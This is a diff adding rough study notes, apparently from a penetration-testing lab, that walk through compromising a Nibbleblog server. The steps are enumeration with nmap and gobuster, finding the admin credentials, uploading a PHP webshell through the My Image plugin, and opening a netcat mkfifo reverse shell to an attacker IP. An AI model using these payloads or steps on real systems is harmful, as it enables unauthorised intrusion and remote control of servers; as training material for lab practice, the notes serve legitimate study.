@@ -620,7 +620,7 @@ black-box : no information provide/ only company name/ need indept reconaissance
 grey-box:   give certain infor/some ip/low level credential/AD/ this simulated insider or what atk can do with low level of access/atk looking for misconfig and attemp exploitation
 white-box: give complete access/web admin account/source code,build diagram/look for logic vul and other difficult to discover flaws/ in network test they may be given admin level credential to dig into ad or other system for misconfig tha may otherwise be missed.
 this assessment type is highly comprehensive as the tester will have access to both sides of a target and perform a comprehensive analysis
-
+=========================================================================
 \\\\Nmap
 -quick scan for open port: $nmap -sV --open -oA nibbles_initial_scan <ip addr>
 <exp> ---open scan top 1000 port
@@ -634,3 +634,88 @@ $nmap -sV --open -oA nibbles_initial_scan <ip>
 $nmap -sC -p 22,80 -oA file_scan <ip> (since we know hich port open) -> nothing usefull
 -> using http-enum script 
 $nmap -sV --script=http-enum -oA file_scan <ip>
+====================================================================
+\\\\\Nibbles- Web Footprinting
+\\what web
+-identify the web app in use
+ $whatweb <ip>
+also check together $curl http://... expose /nibbleslog/  then -> check with which reveal $whatweb http://<url/ip>/nibbleslog
+-> search google for nibbleglog exploit" https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/ => this flaw allow an authenticated atker to upload and executed arbitrary PHP code on the underlying web server
+the metasploit module in question wok for version 4.0.3. we donot know ... -> look at the source code of the metasploit module, we can see that the exploi uses user-supplied credentials to authenticate the admin portal at /admin.php
+-use gobuster to be thorough and check fo any other accessible pages/directory
+$gobuster dir -u http://<ip>/nibbleglog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
+-> it will result in endpoint list (dir path) and even a README page for interesting infor such as version number
+-> $curl http://<ip>/nibbleglog/README -> THE PHP version are in use -> checking admin pỏtal
+-> use default credential admin:admin and admin:pasword, to no aval there is a reset password function but we receive an email error
+and hight rate request trigger a lockout -> back to the dir brute-forcing reslt the 200 status code show pages/dir that are directly accessible,the 403 status code in the out put indicate access to these resource are forbit.
+301 is a permanent redirect -> try to explore all => brosing to https://<ip>/nibbleblog/content -> show some interesting subdir public, private, and tmp. digging around for a while we find users.xml file which at least seem to confirm the user name is indeed admin
+it also show backlisted IP addr -> request file using curl
+$curl -s http://<ip>/nibbleglog/content/private/user.xml | xmllint --format -
+-> now we got the ID -> seach of nibbleblog related doc show that the pw is set during installation. there no known default password
+-> now we have + a nibbleblog install potentially vul to an authenticated file upload vul
+    + an admin portal at nibbleblog/admin.php
+    +dir listing which confirmed that admin is a valid username
+    +login brute-forcing protection blacklists our IP addr after too many invalid login attemps. this takes login brute-forcing with a tool such as hydra off the table
+-There are no other ports open and we did not find any other dir. which we can confirm by performing additional dir brute-forcing against the root of the web app
+$gobuster dir -u http://<ip>/ --wordlist //usr/share/seclists/Discovery/Web-Content/common.txt
+taking aother look through all of the exposed dir in config.xml 
+$curl -s http://<ip>/nibbleblog/content/private/config.xml | xmllint --formt -
+-> we do see 2 mentions of nibbles in the site title awa the noti email addr. this could be password
+-> performing password cracking offline with Hashcat or attempting to guess a pw, 
+it is not uncommon to successfully crack a pw hash (such as a com wireless network passphrase) using a wordlist genrated by crawling their web using tool
+$CeWL https://github.com/digininja/CeWL
+
+This shows us how crucial thorough enumeration is. Let us recap what we have found so far:
+
+We started with a simple nmap scan showing two open ports
+
+Discovered an instance of Nibbleblog
+
+Analyzed the technologies in use using whatweb
+
+Found the admin login portal page at admin.php
+
+Discovered that directory listing is enabled and browsed several directories
+
+Confirmed that admin was the valid username
+
+Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
+
+Uncovered clues that led us to a valid admin password of nibbles
+
+Keep in mind that iterative enumeration, along with detailed notetaking, is one of the keys to success in this field
+==========================================================
+\\\\ Nibble - Initial Foothold
+now that we are login into admin portal, we need to attempt to turn thiss access into code execution and ultimatelt gain reverse shell access to web browser,
+metaploit module will likely work for this. but enum the admin portal for other avenues.
+$gobuster dir -u http://<ip>/nibbleglog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
+<result> we found some pages like plugins which will grand us install or uninstall plugins, the My image plugin allows us to upload an image file could this be abused to upload PHP code potentially
+->attempting to make newpage and embed code or upload files does not seem like path  -> use this plugin to upload a snippet of PHP code instead of an image,
+$<php> <?php system('id'); ?> this snippet can be used to test for code execution
+-> save the code to a file and then click on the browse button and upload it
+we get a bunch of errors but it seem like the file may have uplaoded
+-Now we have to find out where the file uploaded ì it was successful. going back to the dir brute-forcing results, we remember the /content 
+-under this there is a plugin dir and another subdir for my_image 
+the fullpath is at http://<host>/nibbleblog/content/private/plugins/my_image/ in this dir we see 2 file, db.xml and image.php. with a lastest modified date, meaning that our upload was successful 
+let check if we have command execution
+$curl http://<ip>/nibbleblog/content/private/plugins/my_image/image.php
+-> pawned it look like we have gined remote code execution on the web server, and the apache server is running in the nibbler user contexxt.
+let modified the PHP file to obtain a reverse shell and startpoking around the server
+<cheat> the reverse shell cheatsheet https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-udp
+$<bash>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
+NOTE add tun0 VPN IP addr in the <ATTACKING IP> placeholder and a port of our choice for <LISTENING PORT> to catch the reverse shell on our netcat listener.
+$<php> <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
+upload the file again and start a netcat listener in terminal
+$nc -lvnp 9443
+-> cURL the image page again or browse to it in firefox at http://nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.
+$nc -lvnp 9443
+before go futher more let upgrade TTY (since speific command such as su wil not work)
+<cheat>https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+$<bash>python -c 'import pty; pty.spawn("/bin/bash")'  this will spawn a pseudo-terminal so command such as su and sudo work as discussed 
+Try the various techniques for upgrading to a full TTY and pick one that work best for us. our first attemp fail since python2 seem to be missing from the system
+-> search <bash>$ which python3
+/usr/bin/python3
+-> We have Python3 though, which works to get us to a friendlier shell by typing python3 -c 'import pty; pty.spawn("/bin/bash")'
+-> browsing to /home/nibber, found user.txt aws personal.zip
+
